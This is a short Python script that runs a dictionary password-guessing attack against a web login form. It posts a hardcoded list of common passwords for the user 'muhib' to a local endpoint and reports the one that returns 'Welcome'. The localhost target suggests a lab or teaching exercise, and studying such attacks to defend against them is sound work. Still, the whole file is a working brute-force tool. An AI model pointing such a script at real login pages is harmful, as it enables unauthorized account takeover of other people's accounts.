import requests

URL = "http://127.0.0.1:5000/login"

target_user = "muhib"

# attacker's list of passwords to try
passwords = ["123456", "qwerty", "letmein", "pass121", "pass122", "pass123", "pass124"]

for pw in passwords:
    r = requests.post(URL, data={"username" : target_user, "password" : pw}, timeout=10)

    if "Welcome" in r.text:
        print(f"Cracked {target_user} : {pw}")
        break
    else:
        print(f"tried {pw} ... no")